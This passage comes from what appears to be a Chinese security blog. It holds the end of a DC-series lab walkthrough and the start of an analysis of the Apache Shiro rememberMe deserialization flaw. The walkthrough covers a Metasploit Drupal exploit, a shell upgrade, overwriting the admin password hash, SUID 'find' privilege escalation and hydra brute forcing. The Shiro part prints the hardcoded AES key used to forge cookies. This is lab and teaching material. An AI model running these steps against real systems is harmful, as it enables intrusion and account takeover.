<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">whatweb -v 192.168.113.148</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909155519077.png"
                      alt="image-20230909155519077"
                ></p>
<p>指纹识别出来这是一个drupal 7的cms</p>
<p>这里使用msfconsole进行漏洞的搜索和利用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909155744088.png"
                      alt="image-20230909155744088"
                ></p>
<p>漏洞检索</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">search Drupal</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909155926867.png"
                      alt="image-20230909155926867"
                ></p>
<p>这里漏洞很多</p>
<p>但是测试只有编号为1的可以使用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909160939336.png"
                      alt="image-20230909160939336"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">options</span><br></pre></td></tr></table></figure></div>

<p>查看设置</p>
<p>配置目标靶机地址，和攻击机地址，也就是本机地址</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909161031876.png"
                      alt="image-20230909161031876"
                ></p>
<p>设置完就可以输入exploit开始进行漏洞利用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909161209344.png"
                      alt="image-20230909161209344"
                ></p>
<p>利用成功</p>
<p>这里进行getshell</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909161311501.png"
                      alt="image-20230909161311501"
                ></p>
<p>可以看到一个flag1.txt</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909161423066.png"
                      alt="image-20230909161423066"
                ></p>
<p>意思是让查看一下配置文件</p>
<p>网上可以搜索到durpal的配置文件的路径</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/sites/default</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909161622967.png"
                      alt="image-20230909161622967"
                ></p>
<p>我们这里起的是一个反向shell</p>
<p>这里直接用python的 pty模块升级交互式shell</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909161706448.png"
                      alt="image-20230909161706448"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909161914430.png"
                      alt="image-20230909161914430"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909162118874.png"
                      alt="image-20230909162118874"
                ></p>
<p>flag2没有具体告诉我们flag3在哪里</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909162337296.png"
                      alt="image-20230909162337296"
                ></p>
<p>但是我们可以找到</p>
<p>数据库的账号密码，登录进入数据库看看有没有敏感信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909162533641.png"
                      alt="image-20230909162533641"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909162734376.png"
                      alt="image-20230909162734376"
                ></p>
<p>进入drupaldb数据库，查看表</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909163008070.png"
                      alt="image-20230909163008070"
                ></p>
<p>查看里面的数据</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909163130086.png"
                      alt="image-20230909163130086"
                ></p>
<p>在这里面我们可以找到</p>
<p>在这里面我们可以找到管理员的账号密码</p>
<p>但是密码是被加密了</p>
<p>看网上师傅的wp说是drupal存在加密脚本</p>
<p>我们可以用加密脚本加密一个我们自己设置的密码，然后把这个管理员密码替换掉</p>
<p>加密脚本文件路径在&#x2F;var&#x2F;www&#x2F;scripts&#x2F;password-hash.sh。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">php /var/www/scripts/password-hash.sh 123456789</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909164443711.png"
                      alt="image-20230909164443711"
                ></p>
<p>那我们后面就可以进行密码替换了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">update users set pass = &quot;$S$D8yKKKzqsc2R.PZyfXmrY/R//m.mDetlFB3DU/D3srEPHqfCtyi/&quot; where name =&#x27;admin&#x27;;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909164733153.png"
                      alt="image-20230909164733153"
                ></p>
<p>然后我们这里已经成功把密码替换成我们自己设置的</p>
<p>然后我们直接去登录页面登录就行了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909165101345.png"
                      alt="image-20230909165101345"
                ></p>
<p>成功登录进来，而且我们也发现了flag3的位置</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909165214519.png"
                      alt="image-20230909165214519"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909165307393.png"
                      alt="image-20230909165307393"
                ></p>
<p>根据提示查看etc&#x2F;passwd</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909165341004.png"
                      alt="image-20230909165341004"
                ></p>
<p>flag4在home目录下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909165806415.png"
                      alt="image-20230909165806415"
                ></p>
<p>需要提权到root权限才可以</p>
<p>尝试suid提权</p>
<h1 id="四、提权"><a href="#四、提权" class="headerlink" title="四、提权"></a>四、提权</h1><p>查看所有有s标识为的命令</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909170505396.png"
                      alt="image-20230909170505396"
                ></p>
<p>有很多命令都有s标识位</p>
<p>这里尝试使用find提权</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909170723993.png"
                      alt="image-20230909170723993"
                ></p>
<p>尝试使用root执行命令</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">find `which find` -exec whoami \;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909170820781.png"
                      alt="image-20230909170820781"
                ></p>
<p>提权</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">find . -exec /bin/bash -p \;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909171428691.png"
                      alt="image-20230909171428691"
                ></p>
<p>可以看到提权成功</p>
<p>进入后面home查看flag4</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909171717246.png"
                      alt="image-20230909171717246"
                ></p>
<h1 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h1><p>这台靶机主要是学习了一下漏洞扫描和里利用工具的使用</p>
<h2 id="whatweb指纹识别"><a href="#whatweb指纹识别" class="headerlink" title="whatweb指纹识别"></a>whatweb指纹识别</h2><p>安装：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install whatweb</span><br></pre></td></tr></table></figure></div>

<p>kali中自带的有</p>
<p>参数：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">h 查看帮助信息</span><br><span class="line">--version 查看版本信息</span><br><span class="line">-i 指定要扫描的文件</span><br><span class="line">-v 详细显示扫描的结果</span><br><span class="line">-a 指定运行级别</span><br></pre></td></tr></table></figure></div>

<p> 所有参数：<br> 使用添加whatweb -h查看所有参数</p>
<p>常规扫描：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">whatweb url</span><br></pre></td></tr></table></figure></div>

<p>批量扫描</p>
<p>将url全部写入一个txt中，然后使用-i参数指定文件就可以了</p>
<p>扫描结果显示详细内容</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">whatweb -v ip</span><br></pre></td></tr></table></figure></div>

<h2 id="msfconsole漏洞扫描利用"><a href="#msfconsole漏洞扫描利用" class="headerlink" title="msfconsole漏洞扫描利用"></a>msfconsole漏洞扫描利用</h2><p>安装：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install metasploit-framework #kali自带的有</span><br></pre></td></tr></table></figure></div>

<p>使用方法，终端输入msfconsole</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909172414215.png"
                      alt="image-20230909172414215"
                ></p>
<p><strong>msf控制台参数运用</strong></p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">- banner #这个主要是查看metasploit的版本信息，利用模块数量、payload数量等等。 </span><br><span class="line">- use #这个是使用参数。如你要使用到某个利用模块，payload等，那么就要使用到use参数 </span><br><span class="line">- Search #当你使用msfconsole的时候，你会用到各种漏洞模块、各种插件等等。所以search命令就很重要。   使用命令 `help search` 可以查看具体使用方法；   其他使用方法：   查mysql:`search name:mysql`; 查joomla:`search joomla`;查ubutu漏洞：`searchsploit ubuntu 16.04`；查ms08-067漏洞：`search ms08-067` ...... </span><br><span class="line">- show #这个命令用的很多。如果单纯的输入show，那么就会显示出所有的payload，利用模块，post模块，插件等等。但是一般我们都不这么使用。如果要显示利用模块，那么就输入show exploits。如果要显示payload，那么就输入show payloads。</span><br></pre></td></tr></table></figure></div>

<p><strong>生成payload时常见参数说明：</strong></p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">-p, –payload &lt; payload&gt; 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的</span><br><span class="line">-l, –list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all</span><br><span class="line"> -n, –nopsled &lt; length&gt; 为payload预先指定一个NOP滑动长度 </span><br><span class="line">-f, –format &lt; format&gt; 指定输出格式 (使用 –help-formats 来获取msf支持的输出格式列表) </span><br><span class="line">-e, –encoder [encoder] 指定需要使用的encoder（编码器）,指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload </span><br><span class="line">-a, –arch &lt; architecture&gt; 指定payload的目标架构，例如x86 | x64 | x86_64 –platform &lt; platform&gt; 指定payload的目标平台 </span><br><span class="line">-s, –space &lt; length&gt; 设定有效攻击荷载的最大长度，就是文件大小 </span><br><span class="line">-b, –bad-chars &lt; list&gt; 设定规避字符集，指定需要过滤的坏字符例如：不使用 &#x27;\x0f&#x27;、&#x27;\x00&#x27;; -i, –iterations &lt; count&gt; 指定payload的编码次数 </span><br><span class="line">-c, –add-code &lt; path&gt; 指定一个附加的win32 shellcode文件 </span><br><span class="line">-x, –template &lt; path&gt; 指定一个自定义的可执行文件作为模板,并将payload嵌入其中 </span><br><span class="line">-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行 </span><br><span class="line">–payload-options 列举payload的标准选项 </span><br><span class="line">-o, –out &lt; path&gt; 指定创建好的payload的存放位置 </span><br><span class="line">-v, –var-name &lt; name&gt; 指定一个自定义的变量，以确定输出格式 </span><br><span class="line">–shellest 最小化生成payload -h, –help 查看帮助选项 </span><br><span class="line">–help-formats 查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure></div>

<h2 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h2><p>使用方法 ：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit 目标名称</span><br></pre></td></tr></table></figure></div>

<p>下载payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit -m exp文件名</span><br></pre></td></tr></table></figure></div>

<h2 id="hydra（ssh爆破工具）"><a href="#hydra（ssh爆破工具）" class="headerlink" title="hydra（ssh爆破工具）"></a>hydra（ssh爆破工具）</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l 用户名 -P /usr/share/wordlists/rockyou.txt.gz ssh://ip</span><br></pre></td></tr></table></figure></div>

<p>-l 指定破解的用户，对特定用户破解，-P 指定密码字典。</p>
<p>&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz是kali自带的。</p>
]]></content>
      <tags>
        <tag>渗透-靶机-DC系列</tag>
      </tags>
  </entry>
  <entry>
    <title>初探shiro反序列化</title>
    <url>/2023/09/12/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h1 id="一、关于shiro"><a href="#一、关于shiro" class="headerlink" title="一、关于shiro"></a>一、关于shiro</h1><p>shiro是一种开源的java安全框架。它提供了身份验证（Authentication）、授权（Authorization）、加密（Cryptography）和会话管理（Session Management）等安全功能，用于保护Web应用程序和非Web应用程序中的安全性。可运行在web应用和非web应用中。使用Shiro框架可以使应用程序的安全性得到提高，同时也可以使开发者更加方便地进行身份验证、授权和会话管理等操作，减少了开发的复杂度和工作量。</p>
<h1 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h1><p>github有可以直接利用的环境</p>
<p>我们这里直接从github导入就行了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/apache/shiro.git</span><br><span class="line">cd shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure></div>

<p>编辑shiro&#x2F;samples&#x2F;web目录下的pom.xml,将jstl的版本修改为1.2。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jstl&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.2&lt;/version&gt;</span><br><span class="line">    &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>

<p>导入项目，然后配置Tomcat环境</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912201106389.png"
                      alt="image-20230912201106389"
                ></p>
<p>shiro为了保持用户登录状态提供了一个rememberme选项</p>
<p>当我们勾选了这个选项会在cookie中生成一个字符串用户保存用户的登录状态</p>
<p>从而使用户再访问时不用再次登录</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912201253811.png"
                      alt="image-20230912201253811"
                ></p>
<h1 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h1><h2 id="加密流程分析"><a href="#加密流程分析" class="headerlink" title="加密流程分析"></a>加密流程分析</h2><p>生成字段的位置在org.apache.shiro.mgt.DefaultSecurityManager#login</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public Subject login(Subject subject, AuthenticationToken token) throws AuthenticationException &#123;</span><br><span class="line">    AuthenticationInfo info;</span><br><span class="line">    try &#123;</span><br><span class="line">        info = authenticate(token);</span><br><span class="line">    &#125; catch (AuthenticationException ae) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            onFailedLogin(token, ae, subject);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            if (log.isInfoEnabled()) &#123;</span><br><span class="line">                log.info(&quot;onFailedLogin method threw an &quot; +</span><br><span class="line">                        &quot;exception.  Logging and propagating original AuthenticationException.&quot;, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        throw ae; //propagate</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Subject loggedIn = createSubject(token, info, subject);</span><br><span class="line"></span><br><span class="line">    onSuccessfulLogin(token, info, loggedIn);</span><br><span class="line"></span><br><span class="line">    return loggedIn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>这段代码主要实现了用户的验证和认证</p>
<p>在认证成功后会进入  <code>onSuccessfulLogin()</code>方法</p>
<p>跟进  <code>onSuccessfulLogin()</code>方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912183417105.png"
                      alt="image-20230912183417105"
                ></p>
<p>继续跟进到<code>rememberMeSuccessfulLogin</code>方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912183508511.png"
                      alt="image-20230912183508511"
                ></p>
<p>我们这里在<code>RememberMeManager rmm = getRememberMeManager();</code>处打上断点</p>
<p>然后打开调试模式，然后进行登录并勾选remember选项</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912183639612.png"
                      alt="image-20230912183639612"
                ></p>
<p>然后我们的代码会直接跳到我们打断点的地方</p>
<p>我们打断的的地方其实就是获取remeber这个对象</p>
<p>然后会根据是否获取到来判读我们是否勾选了remeber选项</p>
<p>勾选了remeber选项这里就会对获取到的对象调用<code>onSuccessfulLogin</code>方法</p>
<p>跟进到<code>onSuccessfulLogin</code>方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912184232532.png"
                      alt="image-20230912184232532"
                ></p>
<p>我们跟进到<code>onSuccessfulLogin</code>方法发现这里调用了<code>forgetIdentity</code>方法对subject进行处理，这里的subject对象表示单个用户的状态和安全操作，包含认证、授权等。</p>
<p>继续跟进到<code>forgetIdentity</code>方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912184552958.png"
                      alt="image-20230912184552958"
                ></p>
<p>然后继续跟进</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912184640754.png"
                      alt="image-20230912184640754"
                ></p>
<p>这里的<code>forgetIdentity</code>的作用是清除上次的cookie里认证值，然后又调用了<code>removeFrom</code>方法</p>
<p>我们这里跟进这个方法，分析一下这个方法做了些什么</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void removeFrom(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">    String name = getName();</span><br><span class="line">    String value = DELETED_COOKIE_VALUE;</span><br><span class="line">    String comment = null; //don&#x27;t need to add extra size to the response - comments are irrelevant for deletions</span><br><span class="line">    String domain = getDomain();</span><br><span class="line">    String path = calculatePath(request);</span><br><span class="line">    int maxAge = 0; //always zero for deletion</span><br><span class="line">    int version = getVersion();</span><br><span class="line">    boolean secure = isSecure();</span><br><span class="line">    boolean httpOnly = false; //no need to add the extra text, plus the value &#x27;deleteMe&#x27; is not sensitive at all</span><br><span class="line"></span><br><span class="line">    addCookieHeader(response, name, value, comment, domain, path, maxAge, version, secure, httpOnly);</span><br><span class="line"></span><br><span class="line">    log.trace(&quot;Removed &#x27;&#123;&#125;&#x27; cookie by setting maxAge=0&quot;, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>这里<code>removeFrom</code>主要是在set-cookie中添加了一个<code>rememberMe=deleteMe</code></p>
<p>通过上面的分析我们可以知道<code>forgetIdentity</code>最终主要实现了消除上次登录cookie里的认证值，然后在cookie中添加rememberMe字段</p>
<p>那我们跳回到<code>onSuccessfulLogin</code>方法</p>
<p>然后<code>isRememberMe(token)</code>会判断我们是否设置了rememberMe字段</p>
<p>设置会进入到</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">rememberIdentity(subject, token, info);</span><br></pre></td></tr></table></figure></div>

<p>我们这里继续跟进到<code>rememberIdentity</code>方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912185544630.png"
                      alt="image-20230912185544630"
                ></p>
<p>这里使用 <code>getIdentityToRemember</code> 方法从 <code>subject</code> 和 <code>authcInfo</code> 参数中获取身份信息并将其存储在 <code>principals</code> 中。</p>
<p>继续跟进到<code>rememberIdentity</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912190556104.png"
                      alt="image-20230912190556104"
                ></p>
<p>这里的<code>accountPrincipals</code>就是我们上面存储的身份信息</p>
<p>这里调用<code>convertPrincipalsToBytes</code>方法对我们存储的身份信息进行处理</p>
<p>继续跟进到<code>convertPrincipalsToBytes</code>方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912190918509.png"
                      alt="image-20230912190918509"
                ></p>
<p>在这个方法中调用<code>serialize</code>方法对存储的身份信息进行了序列化</p>
<p>我们跟进到序列化方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912191638110.png"
                      alt="image-20230912191638110"
                ></p>
<p>到这里就可以很明显的看懂对用户名进行了序列化</p>
<p>我们继续回到<code>convertPrincipalsToBytes</code>方法</p>
<p>在上面对用户进行序列化处理后转化为字节数组</p>
<p>然后会调用encrypt对字节数组进行加密</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912191745733.png"
                      alt="image-20230912191745733"
                ></p>
<p>我们跟进到这个用于加密的方法 <code>encrypt</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912192109930.png"
                      alt="image-20230912192109930"
                ></p>
<p>这里是对字符数组进行加密的具体实现</p>
<p>我们根据调试信息可以看到加密算法为AES，模式为CBC，填充算法为PKCS5Padding。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912192040778.png"
                      alt="image-20230912192040778"
                ></p>
<p>这里的算法是AES，这里的<code>getEncryptionCipherKey</code>就是获得默认密钥进行加密的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912192702539.png"
                      alt="image-20230912192702539"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA==就是加密用的固定密钥</span><br></pre></td></tr></table></figure></div>

<p>加密完成后，这里跳回到<code>rememberIdentity</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912192802719.png"
                      alt="image-20230912192802719"
                ></p>
<p>跟进到<code>rememberSerializedIdentity</code>方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912192939517.png"
                      alt="image-20230912192939517"
                ></p>
<p>在这里会对加密后的字节数组进行base64编码，然后会将生成的字符串保存在cookie中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912193344403.png"
                      alt="image-20230912193344403"
                ></p>
<p>也就是我们cookie中rememberMe的值</p>
<p>那么通过上面的分析我们知道加密的过程大概就是序列化，然后进行AES加密，最后进行base64编码</p>
<p>那么解密的过程就和上面大概反过来</p>
<h2 id="解密流程分析"><a href="#解密流程分析" class="headerlink" title="解密流程分析"></a>解密流程分析</h2><p>对cookie中rememberMe的解密代码也是在<code>AbstractRememberMeManager.java</code>中实现</p>
<p>我们这里直接在<code>getRememberedPrincipals</code>方法打断点</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912194036579.png"
                      alt="image-20230912194036579"
                ></p>
<p>我们这里跟进到<code>getRememberedSerializedIdentity</code>方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912194319354.png"
                      alt="image-20230912194319354"
                ></p>
<p>可以看到这里getRememberedSerializedIdentity对返回cookie中rememberMe的base64解码处理。</p>
<p>然后调用<code>convertBytesToPrincipals</code>方法对解码后的字节处理</p>
<p>我们这里跟进去分析一下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912194537446.png"
                      alt="image-20230912194537446"
                ></p>
<p>这里调用decrypt对字节进行解密处理</p>
<p>然后回到<code>convertBytesToPrincipals</code></p>
<p>对解密后的字节调用<code>deserialize</code>处理</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912195200809.png"
                      alt="image-20230912195200809"
                ></p>
<p>这里调用了readObject方法对字节进行反序列化</p>
<p>这也是我们漏洞的所在，因为通过我们上面的分析，我们知道对序列化后的字节数组的加密使用的是aes加密，aes使用的默认的固定密钥加密，那我们只需要将我们的反序列化攻击链通过aes进行加密，然后把cookie中的remember的值给替换掉，在进行到上面这一步进行反序列化的时候就会造成反序列化的利用。</p>
<p>产生这个漏洞的最主要原因就是因为固定key，导致攻击者可以替换掉这个rememberme字段的值为自己的攻击链，造成反序列化漏洞利用。</p>
<h1 id="四、漏洞利用"><a href="#四、漏洞利用" class="headerlink" title="四、漏洞利用"></a>四、漏洞利用</h1><p>在上面我们分析了shiro框架rememberme字段的加密和解密流程，然后对shiro反序列化漏洞的原因进行了分析</p>
<p>那么我们这里尝试通过URLDNS利用链对这个反序列化漏洞进行验证。</p>
